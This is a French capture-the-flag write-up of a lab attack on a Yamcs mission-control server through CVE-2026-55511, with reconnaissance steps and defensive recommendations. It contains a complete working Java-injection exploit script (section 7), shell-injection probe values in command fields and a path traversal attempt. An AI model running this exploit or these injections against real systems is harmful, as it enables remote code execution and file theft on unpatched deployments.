---
layout: single
header:
  overlay_image: /assets/images/banner-020.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab StarFall : injection Java dans StreamSQL de Yamcs (CVE-2026-55511) — RCE via compilateur d'agrégats Janino"
date: 2026-11-12
categories: [CTF, Exploit]
tags: [ctf, yamcs, cve-2026-55511, streamsql, java-injection, janino, rce, ics-ot, space, kali, nmap, gobuster, bucket, tse, cfdp, mitre-attck]
---

**Cible :** `176.16.177.251`  
**Application :** Yamcs 5.11.13 — instance `simulator`  
**CVE :** CVE-2026-55511  
**Vecteur :** `POST /api/archive/simulator:executeSql` — injection de code Java dans le nom de colonne d'un agrégat StreamSQL  
**Flag :** `flag_cad980a8_c06f_4f8b_9309_d00fbb019ea2`

> **Périmètre :** le serveur/lab explicitement fourni pour cet exercice. Ne pas réutiliser ces commandes contre des systèmes tiers.

---

## 1. Résumé exécutif

Le serveur expose Yamcs sur TCP `8090` **sans authentification**. L'API révèle la version `5.11.13`, l'instance `simulator` et la route `POST /api/archive/simulator:executeSql`, qui accepte des requêtes StreamSQL.

L'exploitation repose sur une **injection de code Java** dans le nom d'une colonne utilisée par l'agrégat `sum(...)`. Yamcs compile certaines expressions StreamSQL en classes Java avec Janino. Dans cette version vulnérable, le nom contrôlé de la colonne est réinjecté comme identifiant Java sans échappement suffisant.

**Chaîne d'exploitation en trois étapes :**

| Étape | Instruction SQL | Effet |
|---|---|---|
| 1 | `CREATE TABLE` | Fixe le nom de colonne malveillant dans le schéma |
| 2 | `INSERT` | Ajoute une ligne pour que l'agrégat traite un tuple |
| 3 | `SELECT sum(...)` | Déclenche la compilation Janino → exécution du code Java injecté |

Le code Java injecté a copié `/home/local.txt` dans l'objet `flag.txt` du bucket `stacks`. L'objet a ensuite été téléchargé via l'API de stockage Yamcs.

```
flag_cad980a8_c06f_4f8b_9309_d00fbb019ea2
```

> Les essais sur TSE, CFDP, `DELETE_RECORDING`, `simulate_los.py` et la traversée de chemin du bucket n'ont pas fourni de RCE. Ils sont documentés pour distinguer les indices observés des fausses pistes.

---

## 2. Contexte et limites

Le challenge se présente comme une évaluation d'un système de contrôle de mission spatiale (thèmes : Linux, Command Injection, ICS/OT, RCE). Les chemins de flags indiqués sont `/home/local.txt` et `/root/proof.txt`.

Les commandes ont été lancées depuis Kali contre l'instance du lab. Les résultats des commandes exploratoires sont réduits aux lignes qui établissent leur conclusion ; les réponses des endpoints sont conservées lorsque pertinentes.

---

## 3. Reconnaissance initiale

### 3.1 Ports et services identifiés

```bash
IP=176.16.177.251
sudo nmap -Pn -p- -sC -sV -T4 "$IP"
```

**Sortie utile :**

```
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
8023/tcp  open  arca-api?     Yamcs TSE Commander
8090/tcp  open  opsmessaging? HTTP API Yamcs
8135/tcp  open  unknown
10015/tcp open  unknown
10016/tcp open  unknown
10023/tcp open  cefd-vmp?
10025/tcp open  unknown
10115/tcp open  netiq-endpt?
```

> Le service TSE `8023` expose une bannière de commande avec les instruments disponibles : `rigol`, `simulator`, `tenma`. Le port `8090` est la piste API principale.

### 3.2 Vérification des ports web usuels

```bash
python3 - <<'PY'
import socket
host = "176.16.177.251"
for port in [80,443,8000,8080,8443,5000,3000,8888,9000,22,21,4433]:
    sock = socket.socket()
    sock.settimeout(2)
    try:
        sock.connect((host, port))
        print(port, "OPEN")
        if port in (80,443,8000,8080,8443,5000,3000,8888,9000):
            sock.sendall(f"GET / HTTP/1.0\r\nHost: {host}\r\n\r\n".encode())
            print(repr(sock.recv(500)))
    except Exception as exc:
        print(port, type(exc).__name__)
    finally:
        sock.close()
PY
```

```bash
curl -i --max-time 10 "http://$IP:8090/"
curl -i --max-time 10 "http://$IP:8090/robots.txt"
```

| Chemin | Résultat |
|---|---|
| `GET /` | HTTP 404 |
| `GET /robots.txt` | HTTP 200 — `Disallow: /` |

### 3.3 Énumération web

```bash
gobuster dir -u "http://$IP:8090/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x html,js,json,txt
```

**Résultats :**

```
api          (Status: 200) [Size: 447]
auth         (Status: 200) [Size: 36]
favicon.ico  (Status: 200) [Size: 15086]
robots.txt   (Status: 200) [Size: 26]
```

**Contenu de `/api` :**

```json
{
  "yamcsVersion": "5.11.13",
  "serverId": "ip-176-16-177-251",
  "defaultYamcsInstance": "simulator",
  "plugins": [
    {"name":"yamcs-tse","version":"5.11.13","vendor":"Space Applications Services"},
    {"name":"yamcs-web","version":"5.11.13","vendor":"Space Applications Services"}
  ]
}
```

**Contenu de `/auth` :**

```json
{"requireAuthentication":false}
```

> L'API est accessible **sans authentification** et Yamcs annonce la version `5.11.13`.

---

## 4. Énumération de l'API Yamcs

### 4.1 Routes et instance

```bash
curl -sS "http://$IP:8090/api/routes" -o /tmp/starfall-routes.json

for p in instances links topics; do
  echo "===== /api/$p ====="
  curl -sS "http://$IP:8090/api/$p"
  echo
done
```

**Routes pertinentes identifiées :**

```
/api/activities/{instance}/executors
/api/activities/{instance}/scripts
/api/archive/{instance}:executeSql          ← vecteur d'exploitation
/api/buckets/{instance}
/api/buckets/{instance}/{bucketName}/objects
/api/storage/buckets/{bucketName}/objects/{objectName*}
/api/processors/{instance}/{processor}/commands/{name*}
/api/mdb/{instance}/commands
/api/links/{instance?}
```

L'instance `simulator` était `RUNNING`, le processeur `realtime` avait le contrôle de commandes activé.

### 4.2 Commandes définies dans la base de mission

```bash
curl -sS "http://$IP:8090/api/mdb/simulator/commands" -o /tmp/commands.json
jq -r '.commands[] | [.qualifiedName, (.shortDescription // ""), ([.argument[]?.name] | join(", "))] | @tsv' /tmp/commands.json
```

**Commandes exposées (extrait) :**

| Commande | Arguments |
|---|---|
| `/TSE/COMMAND` | — |
| `/TSE/QUERY` | — |
| `/TSE/simulator/get_battery_voltage` | `n` |
| `/TSE/simulator/start_los` | — |
| `/TSE/simulator/stop_los` | — |
| `/YSS/SIMULATOR/DELETE_RECORDING` | `filename` |
| `/YSS/SIMULATOR/DOWNLOAD_FILE` | `destinationId`, `filename`, `pdu_loss_0..3` |
| `/YSS/SIMULATOR/LIST_RECORDINGS` | — |
| `/YSS/SIMULATOR/SWITCH_VOLTAGE_ON` | `voltage_num` |

---

## 5. Pistes explorées sans succès

### 5.1 Yamcs TSE Commander — port 8023

```bash
nc -nv 176.16.177.251 8023
```

Dans la session interactive :

```
:tse:instrument simulator
*IDN?
→ SPACEAPPS,Demo Simulator

*IDN?;id
→ SPACEAPPS,Demo Simulator;unrecognized command

*IDN?;cat /home/local.txt
→ SPACEAPPS,Demo Simulator;unrecognized command
```

> Le simulateur interprète ces valeurs comme des commandes d'instrument. Pas d'injection shell confirmée via TSE.

### 5.2 Télécommande `LIST_RECORDINGS`

```bash
curl -si -X POST \
  "http://$IP:8090/api/processors/simulator/realtime/commands/YSS/SIMULATOR/LIST_RECORDINGS" \
  -H 'Content-Type: application/json' -d '{}'
```

Statut : `Verifier_Complete_Status: OK`. Mais l'historique ne contenait pas le contenu d'une liste de fichiers.

### 5.3 Tentative CFDP avec `DOWNLOAD_FILE`

```bash
curl -sS -X POST \
  "http://$IP:8090/api/processors/simulator/realtime/commands/YSS/SIMULATOR/DOWNLOAD_FILE" \
  -H 'Content-Type: application/json' \
  -d '{"args":{"destinationId":11,"filename":"/home/local.txt","pdu_loss_0":-1,"pdu_loss_1":-1,"pdu_loss_2":-1,"pdu_loss_3":-1}}'
```

**Résultat :**

```
Verifier_Complete_Status  NOK
CommandComplete_Status    NOK
```

`GET /api/filetransfer/simulator/services` → `{}`. Pas de service CFDP configuré.

### 5.4 `DELETE_RECORDING` et injections shell

Envoi de chaînes comme `starfall-nonexistent;id;#` et `sf-probe;cat /home/local.txt;#` dans le champ `filename` :

```bash
curl -sS -X POST \
  "http://$IP:8090/api/processors/simulator/realtime/commands/YSS/SIMULATOR/DELETE_RECORDING" \
  -H 'Content-Type: application/json' \
  -d '{"args":{"filename":"starfall-nonexistent;id;#"}}'
```

`Verifier_Complete_Status: OK`, mais aucune exécution de `id` ou `cat` prouvée. Test temporel avec `sleep 5` → achèvement en ~1 s. **Piste non confirmée.**

### 5.5 Activités `SCRIPT`

```bash
curl -si "http://$IP:8090/api/activities/simulator/scripts"
# → {"scripts":["say_hi.sh","simulate_los.py"]}
```

- `say_hi.sh` lancé avec `; id; cat /home/local.txt` → journal : `root says hi` uniquement, pas d'injection exécutée
- `simulate_los.py` → `Cannot run program "python": No such file or directory`
- Traversée de chemin `../../../../../../bin/sh` → `Directory traversal attempted`
- Champ `runner` → `Unknown argument runner`

> Le message `root says hi` indique le contexte d'exécution root, mais pas la RCE.

### 5.6 Archives de paquets et SQL en lecture

```bash
curl -sS -X POST \
  "http://$IP:8090/api/archive/simulator:executeSql" \
  -H 'Content-Type: application/json' \
  -d '{"statement":"SELECT * FROM events LIMIT 20"}'
```

**Réponse :** une ligne avec `body.message: root says hi`.

> Confirmation de l'accès à l'API SQL et de la visibilité des événements — point de départ de l'exploitation.

### 5.7 Bucket `stacks` et traversée de chemin

```bash
curl --path-as-is -i \
  "http://$IP:8090/api/storage/buckets/stacks/objects/../../../../../../../local.txt?instance=simulator"
```

**Réponse :**

```
HTTP/1.1 500 Internal Server Error
"msg": "Directory traversal attempted: stacks/../../../../../../../local.txt"
```

> La traversée d'URL était bloquée. La copie du flag par la vulnérabilité SQL a contourné ce contrôle.

---

## 6. Vulnérabilité exploitée — CVE-2026-55511

### 6.1 Mécanisme de la double compilation

CVE-2026-55511, intitulée *Yamcs: Authenticated RCE via StreamSQL aggregate-compiler column-name injection*, affecte Yamcs jusqu'à 5.12.7 (branche 5.12) et 5.13.1 (branche 5.13).

Dans le chemin vulnérable, Yamcs compile les expressions d'agrégat StreamSQL (`sum`, etc.) en classes Java avec **Janino**. Le nom d'une colonne, contrôlé par l'utilisateur, est interpolé dans le code source Java généré par `Expression.fillCode_InputDefVars` et `Expression.sanitizeName`. La sanitisation de la version vulnérable ne neutralisait que `/` et `-`, laissant utiles `;`, les espaces, les parenthèses et les accolades.

| Champ | Valeur |
|---|---|
| **CVE** | CVE-2026-55511 |
| **Composant** | Yamcs ≤ 5.12.7 / ≤ 5.13.1 |
| **Endpoint** | `POST /api/archive/{instance}:executeSql` |
| **Privilège Yamcs** | `ControlArchiving` (invité dans le lab) |
| **Correctif** | Yamcs ≥ 5.12.8 ou ≥ 5.13.2 |

**Chemin de compilation :**

```
SELECT sum("colonne_malveillante")
  → CompilableAggregateExpression
  → SumExpression.fillCode_InputDefVars()
  → interpolation du nom dans le source Java
  → compilation Janino
  → exécution du code injecté dans la JVM Yamcs
```

### 6.2 Stratégie d'encodage des chemins

Les chemins `/home/local.txt` et le répertoire de destination contiennent des `/` qui seraient neutralisés par la sanitisation partielle. La solution : encoder chaque caractère en code Unicode décimal dans un tableau Java `new char[]{...}`, puis reconstruire le chemin avec `new String(...)`.

```java
// Exemple pour "/home/local.txt"
new String(new char[]{47,104,111,109,101,47,108,111,99,97,108,46,116,120,116})
```

### 6.3 Distinctions importantes

**Ne pas confondre avec CVE-2026-44632** : cette autre vulnérabilité Yamcs concerne un chemin distinct lié à l'évaluation d'algorithmes Python/Java de la base de mission (privilège `ChangeMissionDatabase`). StarFall a été résolu via le compilateur d'agrégats StreamSQL (`ControlArchiving`) — c'est le chemin de CVE-2026-55511.

**Sur les préconditions :** la fiche CVE exige un utilisateur authentifié avec `ControlArchiving`. L'instance StarFall exposait `requireAuthentication: false` et les opérations SQL nécessaires étaient permises pour l'utilisateur invité. L'absence d'authentification n'est pas, à elle seule, la description de CVE-2026-55511 — c'est une mauvaise configuration aggravante.

---

## 7. Chaîne finale d'exploitation

### 7.1 Script d'exploitation complet

```bash
python3 - <<'PY'
import json, time, urllib.request, urllib.error, sys

base = "http://176.16.177.251:8090"
table = "sf_rce_" + str(int(time.time()))

# Chemins encodés en codes Unicode pour éviter les "/" dans l'identifiant de colonne
src = ",".join(map(str, map(ord, "/home/local.txt")))
dst = ",".join(map(str, map(ord,
    "/home/ubuntu/yamcs-yamcs-5.11.13/examples/simulation/target/yamcs/stacks/flag.txt"
)))

# Code Java injecté dans le nom de colonne
java = (
    "java.nio.file.Files.copy("
    "java.nio.file.Paths.get(new String(new char[]{" + src + "})),"
    "java.nio.file.Paths.get(new String(new char[]{" + dst + "})),"
    "java.nio.file.StandardCopyOption.REPLACE_EXISTING);"
)
payload = "dummy; try { " + java + " } catch (Exception e) {} coldummy=coldummy"
col = '"' + payload + '"'

statements = [
    f'create table {table}({col} double, id int, primary key(id))',
    f'insert into {table}(id, {col}) values(1, 1.0)',
    f'select sum({col}) from {table}',
]

url = base + "/api/archive/simulator:executeSql"

for i, statement in enumerate(statements, 1):
    print(f"\n--- Étape {i} ---")
    req = urllib.request.Request(
        url,
        data=json.dumps({"statement": statement}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as res:
            body = res.read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(body)
        sys.exit(f"Requête refusée (HTTP {e.code}) ; arrêt.")
    print(body)
    try:
        result = json.loads(body)
        if "code" in result:
            sys.exit("Yamcs a renvoyé une erreur ; arrêt.")
    except json.JSONDecodeError:
        pass
PY
```

**Explication des trois instructions :**

| Étape | Instruction | Rôle |
|---|---|---|
| 1 | `CREATE TABLE` | Fixe le nom de colonne malveillant dans le schéma TSDB |
| 2 | `INSERT` | Insère une ligne → l'agrégat aura un tuple à traiter |
| 3 | `SELECT sum(...)` | Force `SumExpression` → compilation Janino → exécution du `Files.copy` injecté |

### 7.2 Sorties obtenues

```
--- Étape 1 ---
{}

--- Étape 2 ---
{
  "columns": [{"name": "inserted", "type": "LONG"}],
  "rows": [{"values": [{"type": "SINT64", "sint64Value": "1"}]}]
}

--- Étape 3 ---
{
  "columns": [{"name": "SumExpression0x364372d6d", "type": "DOUBLE"}],
  "rows": [{"values": [{"type": "DOUBLE", "doubleValue": 1.0}]}]
}
```

### 7.3 Vérification de l'effet et lecture du flag

**Vérification de l'apparition de `flag.txt` dans le bucket `stacks` :**

```bash
curl -sS "http://$IP:8090/api/buckets/simulator/stacks/objects" | jq .
```

```json
{
  "objects": [
    {
      "name": "flag.txt",
      "created": "2026-11-12T14:12:46.952Z",
      "size": "42",
      "contentType": "text/plain"
    },
    {
      "name": "stack.ycs",
      "created": "2025-07-17T22:09:07Z",
      "size": "1007"
    }
  ]
}
```

**Téléchargement du fichier copié :**

```bash
curl -sS -G \
  "http://$IP:8090/api/storage/buckets/stacks/objects/flag.txt" \
  --data-urlencode 'instance=simulator'
```

**Sortie :**

```
flag_cad980a8_c06f_4f8b_9309_d00fbb019ea2
```

---

## 8. Flag

### 🏁 Flag final

```
flag_cad980a8_c06f_4f8b_9309_d00fbb019ea2
```

---

## 9. Conclusion et recommandations défensives

La compromission a été obtenue par l'**API d'archive StreamSQL**, et non par TSE, les noms de fichiers des télécommandes, les transferts CFDP, le bucket traversal ou les scripts. Le point de bascule : API SQL accessible + privilèges permettant de créer une table + version vulnérable du compilateur d'agrégats.

| Mesure | Description |
|---|---|
| ✅ Mise à jour | Yamcs ≥ 5.12.8 (branche 5.12) ou ≥ 5.13.2 (branche 5.13) |
| ✅ Authentification | Activer `requireAuthentication: true` |
| ✅ Principe du moindre privilège | Restreindre `ControlArchiving` aux seuls comptes nécessaires |
| ✅ Isolation OS | Exécuter Yamcs sans droits root, avec un compte dédié |
| ✅ Correction code | Remplacer les noms de colonnes dans les identifiants Java par des noms synthétiques (`col0`, `col1`...) — les noms réels traités comme données correctement échappées |

---

## 10. Sources

| # | Source | Lien |
|---|---|---|
| 1 | CVE-2026-55511 | https://www.cve.org/CVERecord?id=CVE-2026-55511 |
| 2 | GitHub Advisory GHSA-3g44-3m7x-cgg2 | https://github.com/advisories/GHSA-3g44-3m7x-cgg2 |
| 3 | Analyse technique — SecureLayer7 | https://securelayer7.net/lab/cve-2026-55511-yamcs-streamsql-aggregate-column-injection-rce |
| 4 | Advisory CVE-2026-44632 (distinct) | https://github.com/advisories/GHSA-2g95-6x5q-xjwj |
| 5 | Documentation Yamcs — Execute SQL | https://docs.yamcs.org/yamcs-http-api/table/execute-sql/ |
| 6 | Documentation Yamcs — Start Activity | https://docs.yamcs.org/yamcs-http-api/activities/start-activity/ |
| 7 | Documentation Yamcs — Get Object | https://docs.yamcs.org/yamcs-http-api/buckets/get-object/ |

---

## Annexe A — Journal complémentaire des commandes et résultats

### A.1 Requêtes de base et découverte des routes

```bash
IP=176.16.177.251
curl -si "http://$IP:8090/api"
curl -si "http://$IP:8090/auth"
```

**Filtrage des routes par termes clés :**

```bash
python3 - <<'PY'
import json, re
x = json.load(open('/tmp/starfall-routes.json'))
paths = set()
def walk(v):
    if isinstance(v, dict):
        if isinstance(v.get('url'), str): paths.add(v['url'])
        for z in v.values(): walk(z)
    elif isinstance(v, list):
        for z in v: walk(z)
walk(x)
for p in sorted(paths):
    if re.search(r'tse|service|file|bucket|script|shell|exec|debug|config', p, re.I):
        print(p)
PY
```

**Routes retournées (extrait) :**

```
/api/activities/{instance}/scripts
/api/activities/{instance}/executors
/api/archive/{instance}:executeSql
/api/buckets/{instance}
/api/storage/buckets/{bucketName}/objects/{objectName*}
/api/web/instance-config/{instance}
```

**Filtrage des opérations `activities` et `executeSql` avec jq :**

```bash
jq -r '
  .. | objects
  | select((.url? // "") | test("activities|executeSql"))
  | [.service // "", .method // "", .url // ""]
  | @tsv
' /tmp/starfall-routes.json
```

**Résultat :**

```
ActivitiesApi  ListActivities         /api/activities/{instance}/activities
ActivitiesApi  StartActivity          /api/activities/{instance}/activities
ActivitiesApi  GetActivity            /api/activities/{instance}/activities/{activity}
ActivitiesApi  GetActivityLog         /api/activities/{instance}/activities/{activity}/log
ActivitiesApi  CancelActivity         /api/activities/{instance}/activities/{activity}:cancel
ActivitiesApi  ListExecutors          /api/activities/{instance}/executors
ActivitiesApi  ListScripts            /api/activities/{instance}/scripts
TableApi       ExecuteSql             /api/archive/{instance}:executeSql
```

---

### A.2 Événements, paquets et SQL en lecture

**Requête d'événements :**

```bash
curl -sS \
  "http://$IP:8090/api/archive/simulator/events?start=2026-11-12T13:29:00Z&stop=2026-11-12T13:33:00Z&limit=100" |
  jq -r '.events[]? | [.generationTime, .source, .message] | @tsv'
```

Aucune ligne pour cette période. La requête SQL en lecture qui a renvoyé l'événement `say_hi.sh` :

```bash
curl -sS -X POST \
  "http://$IP:8090/api/archive/simulator:executeSql" \
  -H 'Content-Type: application/json' \
  -d '{"statement":"SELECT * FROM events LIMIT 20"}'
```

**Réponse déterminante :**

```
gentime: 2026-11-12T13:58:20.997Z
source: User
body.message: root says hi
```

---

### A.3 Port TCP 8135 — protocole inconnu

```bash
curl -i --max-time 5 "http://$IP:8135/"
nc -nv -w 3 "$IP" 8135
sudo nmap -Pn -sV --version-all --script=banner -p 8135 "$IP"

for cmd in help '?' version; do
  printf '%s\r\n' "$cmd" | nc -nv -w 3 "$IP" 8135
done

timeout 5 openssl s_client -connect "$IP:8135" -brief </dev/null
```

**Résultats :**

```
curl: (52) Empty reply from server
8135/tcp open  unknown
help / ? / version → aucune bannière
TLS → error: unexpected eof while reading
```

> Protocole inconnu — aucune exploitation tentée sur ce port.

---

### A.4 Appels exploratoires aux activités

```bash
curl -si "http://$IP:8090/api/activities/simulator/scripts"
# → {"scripts":["say_hi.sh","simulate_los.py"]}

curl -si "http://$IP:8090/api/activities/simulator/executors"
# → types : COMMAND, COMMAND_STACK, SCRIPT

curl -si "http://$IP:8090/api/web/instance-config/simulator"
```

**Configuration web retournée :**

```json
{
  "displayBucket": "displays",
  "stackBucket": "stacks",
  "parameterArchive": true,
  "tcStreams": ["tc_sim", "tc_tse"]
}
```

```bash
# Route inexistante dans cette version
curl -si "http://$IP:8090/api/activities/simulator/script-runners"
# → HTTP 404
```

---

### A.5 Bucket `stacks` et essai de traversée

```bash
curl -sS "http://$IP:8090/api/buckets/simulator" | jq .
curl -sS "http://$IP:8090/api/buckets/simulator/stacks/objects" | jq .
```

**Téléchargement et lecture de `stack.ycs` :**

```bash
curl -sS -G \
  "http://$IP:8090/api/storage/buckets/stacks/objects/stack.ycs" \
  --data-urlencode 'instance=simulator' \
  -o /tmp/stack.ycs
file /tmp/stack.ycs   # → JSON text data
cat /tmp/stack.ycs
```

Le stack contenait uniquement des télécommandes de tension 1 et des vérifications de paramètres `BatteryVoltage1/2/3`.

**Traversée bloquée :**

```bash
curl --path-as-is -i \
  "http://$IP:8090/api/storage/buckets/stacks/objects/../../../../../../../local.txt?instance=simulator"
# → HTTP 500 — Directory traversal attempted
```

---

### A.6 Lecture finale du bucket après exploitation

Avant exploitation : `numObjects: 1` (uniquement `stack.ycs`).  
Après exécution StreamSQL : `flag.txt` (42 octets) présent.

```bash
curl -sS -G \
  "http://$IP:8090/api/storage/buckets/stacks/objects/flag.txt" \
  --data-urlencode 'instance=simulator'
```

**Réponse brute :**

```
flag_cad980a8_c06f_4f8b_9309_d00fbb019ea2
```
